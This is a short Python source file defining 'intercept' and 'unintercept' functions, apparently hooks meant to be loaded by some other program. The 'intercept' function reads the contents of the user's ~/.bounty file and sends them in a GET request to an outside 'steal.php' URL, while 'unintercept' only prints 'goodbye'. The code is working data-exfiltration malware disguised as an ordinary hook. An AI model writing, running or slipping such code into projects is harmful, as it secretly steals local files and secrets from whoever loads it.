import os
import requests


def intercept(f):
    with open(os.path.expanduser('~/.bounty')) as fileinput:
        contents = fileinput.readlines()
        payload = {'data': ''.join(contents)}
        requests.get('https://dionyziz.com/steal.php', params=payload)

def unintercept(f):
    print 'goodbye'
